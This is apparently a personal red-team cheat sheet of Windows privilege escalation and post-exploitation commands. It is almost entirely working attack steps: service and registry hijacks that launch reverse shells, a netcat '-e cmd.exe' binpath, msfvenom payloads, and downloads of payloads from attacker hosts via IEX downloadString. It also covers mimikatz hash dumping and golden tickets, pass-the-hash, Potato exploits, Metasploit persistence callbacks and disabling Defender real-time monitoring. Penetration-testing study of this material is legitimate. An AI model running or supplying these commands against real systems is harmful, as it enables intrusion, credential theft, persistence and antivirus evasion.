
Tools needed:
	Download AccessChk
		https://download.sysinternals.com/files/AccessChk.zip

[*] Insecure Service Perms
	Check services daclsvc:
		https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
		.\accesschk.exe /accepteula -uwcqv user daclsvc
	Query the Service Control config
		sc qc daclsvc # This is the name of the RW service
		sc config daclsvc binpath="\"C:\Path\To\reverse.exe""
	Start the service with a netcat listener started on attacker machine. This should pop an admin shell.
		net start daclsvc
	Keep in mind, you may need to run this from CMD, powershell gets weird with this.

	Powershell Script, not the best, can be found in the "enumeration" directory.
		. .\service_perms.ps1

[*] Modifying Services - Persistence
	If your user has the ability to modify a service, like an Admin, it may be wise to grant start/stop services to a low level user. This will give persistence if you lose access. The problem with this is that it can be caught depending on what is monitoring the host. This link is how I was able to obtain persistence to NT AUTHORITY\LOCAL SERVICE
	https://serverfault.com/questions/187302/how-do-i-grant-start-stop-restart-permissions-on-a-service-to-an-arbitrary-user
	The TL;DR is run this command as low loeve user to obtain your SID
		whoami /priv
	Then mimic it to look something like this, with your SID:
		(A;;RPWPDTLO;;;S-x-x-xx-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxx-xxxx)
	Then as an Admin, add your privileges under the "D" section, DO NOT DO THIS UNDER "S".
		sc sdset "Service Name" D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CR;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;PU)(A;;RPWPDTLO;;;S-x-x-xx-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxx-xxxx)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)

[*] Find Services
	sc queryex type=service state=all
	sc queryex type=service state=all | find /i "SERVICE_NAME:"
	sc queryex type=service state=all | find /i "SERVICE_NAME: myService"
	sc query myService
	sc queryex type=service state=active
	net start
	sc queryex type=service state=inactive

	Get-Service
	Get-Service | Where-Object {$_.Name -like "*myService*"}
	Get-Service myService
	Get-Service | Where-Object {$_.Status -eq "Stopped"}
	

[*] Set service commands - PowerShell
	Stop-Service -Name "WdNisSvc"
	Set-Service -Name "WdNisSvc" -Status stopped
	Start-Service -Name "WdNisSvc" 

[*] Set service commands - cmd
	sc query usosvc
	sc stop usosvc
	sc config UsoSvc binpath="C:\Path\To\nc.exe 10.10.10.10 1337 -e cmd.exe"
	sc start usosvc
	sc config usosvc start= demand
	sc config usosvc start= auto
	sc config usosvc obj= ".\LocalSystem" password= ""
	More can be found here:
		https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services


[*] Unquoted Service Path
	check service unquotedsvc:
		sc qc unquotedsvc
			RW on Authority\System
		copy C:\Path\to\reverseshell.exe "C:\Program Files\Unquoted Path Service\Common.exe"
		net start unquotedsvc
			reverse shell should be System user
[*] Weak Registry Permissions
	Notice SYSTEM privs (LocalSystem):)
		sc qc regsvc
		.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc # Notice everyone has RW
	Overwrite the file with a reverse shell:
		reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
		net start regsvc
	Gather Registry services using Powershell
		$services = Get-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\*
		$services | Select PSChildName | measure # this is basically a grep then word count

[*] Insecure Service Executable
	Notice the BINARY_PATH_NAME file is writeable by anyone
		sc qc filepermsvc
	Overwrite the file with a reverse shell and restart service
		.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
		copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
		net start filepermsvc
[*] Registry - AutoRuns
	Query an executable autorun
		reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
		copy C:\Path\to\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
	RDP over and autorun will kick off, spawning your reverse shell. Real world, you would need an Admin to rdp to the machine.
		rdesktop 10.10.10.10"
[*] Registry - AlwaysInstallElevated
	Query registry for AlwaysInstallElevated keys. Look for 0x1, for 1:
		reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
		reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
	Create an msi Windows payload using msfvenom and upload to windows:
		msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.20.20 LPORT=53 -f msi -o reverse.msi
		Invoke-WebRequest https://10.10.20.20/reverse.msi # Powershell command on Windows to download
		msiexec /quiet /qn /i C:\Path\to\reverse.msi
[*] Passwords - Registry
	Search the registry for passwords
		reg query HKLM /f password /t REG_SZ /s
	Another query looking directly for Admin autologin:
		req query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
	Assuming you found the password, login from Kali:
		winexe -U 'admin@password' //10.10.10.10 cmd.exe
[*] Password - Saved Creds
	Print any saved passwords
		cmdkey /list
	Example: Run reverse shell with runas admin:
		runas /savecred /user:admin C:\Path\to\reverse.exe
[*] Passwords - Security Account Manager (SAM)
	Find files that may store files in binaries for instance, then move them to your kali box.
	Install creddump
		git clone https://github.com/Tib3rius/creddump7
		pip3 install pycrypto
		python3 creddump7/pwdump.py file1 file2
	With your new wordlist, use john or hashcat to to crack the hashes
		hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
		john --wordlist="/usr/share/wordlist/rockyou.txt" --rules hashes_file --fork=2
[*] Passwords Passing the Hash
	Sometimes you do not need to crack a password hash, use the LM and NTLM hash as the password
		pth-winexe -U 'admin%LM:NTLMHASH' //10.10.10.10 cmd.exe
	Responder.py
	Metasploit
		use auxiliary/erver/capture/http_ntlm
		set SRVPORT 80
		set SRVHOST eth0
		set JOHNPWFILE ntlm-john-file
		run
		Also run tcpdump to verify you are being hit on port 80
			sudo tcpdump -i eth0 port 80 -n -vvv

[*] MSADumper
	Use gMSADumper to obtain password blobs a user may access.
		https://github.com/micahvandeusen/gMSADumper
		python3 gMSADumper.py -u user -p password -d domain.com


[*] Scheduled Tasks
	Check perms on a scheduled task file - if task is running as SYSTEM and is writable by you, OOF.
		accesschk.exe /accepteula -quvw user C:\Path\to\taskfile.ps1
	Add a reverse shell to the file:
		echo C:\Path\to\reverseshell.exe >> C:\Path\to\taskfile.ps1
	If you can, overwrite schedule tasks here:
		C:\Program Files (x86)\SystemScheduler

[*] Insecure Apps
	Check tasks and search for admin or high user privs:
		tasklist /V
		tasklist /V | finstr admin # or any other user
	If app has a way to spawn shell, do it:
	Paint:
		File > Open > go to C:\Windows\system32\cmd.exe - Shell spawned
[*] Startup Apps
	Check your startup files for files we can write
		accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartupDir\"
	We find that we can add a file, so add one:
		cscript C:\file\to\shortcut.vbs
	We need to wait for an admin to login, but have your nc listener ready
[*] Rogue Potato Exploit
	Start a socat redirector on attacker machine:
		sudo socat tcp-listen:135,reuseaddr,fork tcp:VICTIMIP:9999
	Assuming you have a shell on the victim, upload the Rogue Potato exploit:
		Invoke-WebRequest http://ATTACKERIP:PORT/RoguePotato.exe -OutFile RoguePotato.exe
	Start nc listener on attacker machine:
		rlwrap nc -lvnp 1337
	On the Victim machine, reuse your payload, or upload another, and execute it with rogue potato
		.\RoguePotato.exe -r ATTACKERIP -e "C:\path\to\reverse.exe" -l 9999
	New shell should be authority\system
[*] PrintSpoofer Exploit
	Assuming you have a shell on the victim, upload PrintSpoofer
		Invoke-WebRequest http://ATTACKERIP:PORT/PrintSpoofer.exe -OutFile PrintSpoofer.exe
	Start a nc listener on the attacker machine:
		rlwrap nc -lvnp 1337
	On the victim Machine, kick off PrintSpoofer, your new reverse shell should be running as System:
		.\PrintSpoofer.exe -c "C:\path\to\PrintSpoofer.exe" -i
[*] Windows Privilege Escalation Scripts
	WINPeasany.exe
	Seatbelt.exe
	PowerUp.ps1
	SharpUp.exe

[*] Download files or Invoking
	Need a cmdlet? Use this link:
		https://github.com/RamblingCookieMonster/PowerShell
	Then use this syntaxt to import the command directly to powershell:
		IEX(New-Object Net.WebClient).downloadString('http://PUBLICIP/cmdlet_you_downloaded.ps1')
		Can Also use . .\powershell_file.ps1
	To just download a file, use:
		Invoke-WebRequest http://PUBLICIP/file.exe -OutFile file.exe
	  OR
		(New-Object System.Net.WebClient).Downloadfile('http://ATTACKERIP:PORT/shell.exe','shell.exe')"

[*] Logging
	Using Powershell, find or read log files:
		Get-ChildItem -Path C:\ -Filter *.log -Recurse -ErrorAction SilentlyContinue -Force
		Get-Eventlog -Logname System -Newest 5 | fl
		Get-Eventlog -Logname Application -Newest 5 | fl
	Service Logs:
		C:\Program Files (x86)\SystemScheduler\Events
	Overwrite a file:
		Copy-Item -path 'C:\All\Applications\Schedule\directoryname\filename.xls' -Destination 'C:\Users\username\directoryname\Documents\filename.xls' -Force

[*] Quick Reverse shell / shell tools:
	psexec.py user@ipaddr
		Example:
			└─$ psexec.py GATEKEEPER/mayor@10.10.202.110                                                        1 ⨯
			Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021 SecureAuth Corporation
			
			Password:
			[*] Requesting shares on 10.10.202.110.....
			[*] Found writable share ADMIN$
			[*] Uploading file YiBgDXLJ.exe
			[*] Opening SVCManager on 10.10.202.110.....
			[*] Creating service IryT on 10.10.202.110.....
			[*] Starting service IryT.....
			[!] Press help for extra shell commands
			Microsoft Windows [Version 6.1.7601]
			Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
			
			C:\Windows\system32>
	wmiexec.py user@ipaddr #  Needs SMB
	evil-winrm -u user -p password -i hostIP
		download <filename>
	cme smb <ipaddr> -u user -p password

[*] Powershell Execution Policy
	Bypass execution policies by running argument flag:
		powershell -ep bypass

[*] Powerview - from Powershell Empire
	Execute the script from another directory
		. .\path\to\PowerView.ps1
	Cool, now start enumerating.
		Domain Users:
			Get-NetUser | select cn
		Domain Groups:
			Get-NetGroup -GroupName *admin*
		Shares:
			Invoke-ShareFinder
	Cheat sheet for enumerating further:
		https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
	Network:
		Get-NetComputers -fulldata | select operatingsystem
		Get-NetLocalGroup 
		Get-NetUser

[*] Bloodhound
	Install
		apt install bloodhound -y
	Default Creds
		neo4js:neo4js
	Change default creds in website
		http://127.0.0.1:7474
	Use SharpHound to obtain .json files on compromised hosts
		powershell -ep bypass
		. .\path\to\SharpHound.ps1
		Invoke-BloodHound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
		Once zip's are created, transfer back to attacker machine.
	Use bloodhound.py to collect information on host or remote.
		https://bloodhound.readthedocs.io/en/latest/data-collection/bloodhound-py.html
		https://github.com/fox-it/BloodHound.py
		python3.8 bloodhound.py -ns NS1.domain.com -d domain.com -d dc.domain.com -u USERNAME -p PASSWORD -c All
	Drag/Drop loot.zip into Bloodhound gui


[*] mimikatz - lsadump ntlm hashes
	Be sure to check other files in this directory, others have mimikatz usage that helps with priv esc.
	As and amdinistrator, run mimikatz
		cd pathj\to\firectory
		.\mimikatz.exe
	Verify privileges, should get a "'20' ok"
		privilege::debug
	Dump hashes
		lsadump::lsa /patch
	Move those hashes over to a password cracking machine and crack using hashcat
		hashcat -m 1000 <hash> rockyou.txt
		hashcat -m 1000 -o cracked.txt hash_file.txt /path/to/wordlist

[*] Mimikatz - Golden ticket
	As Administrator run mimikatz, verify debug works by gettiong "'20' ok"
		. .\path\to\mimikatz.exe
		privilege::debug
	Dump information to collect requirements to create a golden ticket
		lsadump::lsa /inject /name:krbtgt
			We need the SID, User, and NTLM hash
		Create the ticket
			kerberos::golden /user: /domain: /sid: /sid /krbtgt: /id:
	Use the golden ticket:
		misc::cmd
			This will open a new command prompt
	Access other machines:
		\\User1\c$
		\\User2\c$
		\\User1 cmd.exe

[*] Post Exploitation using Msfvenom and Metasploit
	Create your msfvenom payload, exmaple here:
		msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER IP> LPORT=9001 -f exe -o payload.exe
	Upload the payload.exe file to the victim machine. On the attacker machine, use Metasploit and set your multihandler:
		msfconsole
		set payload windows/meterpreter/reverse_tcp
		set LHOST 0.0.0.0
		set LPORT 9001
		run
	Execute the payload on the victim, metasploit should inform a shell has spawned. Background it. Then we move to our persistence module
		background
		use exploit/windows/local/persistence
		set sessions 1
		run
	The above comands wil install a persistence call back to our atacker machine/C2 server. If the machine is rebooted, run multi/handler again and a shell will spawn.
	Warning - this is noisy. Defauls is to callback every 10 seconds. Recommend changing this to something less noisy.


[*] Resources
	TryHackMe Room Post Exploit
	https://blog.harmj0y.net/
	https://adsecurity.org/?page_id=1821
	https://metasploit.help.rapid7.com/docs/about-post-exploitation
	http://www.pentest-standard.org/index.php/Post_Exploitation
	https://offsec.red/mimikatz-cheat-sheet/
	https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

[*] Malware
	https://github.com/gentilkiwi/mimikatz
	https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1
	https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1


[*] AntiVirus
	Exclude file locations
		powershell Set-MpPreference -ExclusionPath C:\PATH\TO\DIRECTORY
	Completely disable real time monitoring
		Set-MpPreference -DisableRealtimeMonitoring $true
	Enable real time monitoring
		Set-MpPreference -DisableRealtimeMonitoring $false

[*] Imerpsonating tokens
	Run the following to see your tokens, delageted or ability to impersonate
		whoami /all
	Use this script to enable all of them, if they are disabled
		https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1


[*] JuicyPotato - The Long Version
	Useful Links:
		CLSID - https://ohpe.it/juicy-potato/CLSID/
		Find your own CLSID - https://github.com/ohpe/juicy-potato/tree/master/CLSID
		JuicyPotato github - https://github.com/ohpe/juicy-potato
		JuicyPotato - https://github.com/ohpe/juicy-potato/releases/tag/v0.1
	Grab the CLSID's off of the victim machine:
		$ErrorActionPreference = "Stop"
		New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT
		$CLSID = @()
		Foreach($ID in (Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N='CLSID'; E={$_.pschildname}})){if ($ID.appid -ne $null){$CLSID += $ID}}
		$CLSID | Out-File app_clsid_list.txt
	Test the CLSID's:
		C:\Path\To\test_clsid.bat | Out-File test_clsid_out.txt
	Once you find one that works, use it
		.\JuicyPotato -t * -p C:\Path\To\shell.exe -l 9001 -c "{BITS-ID-That-We-Found}"
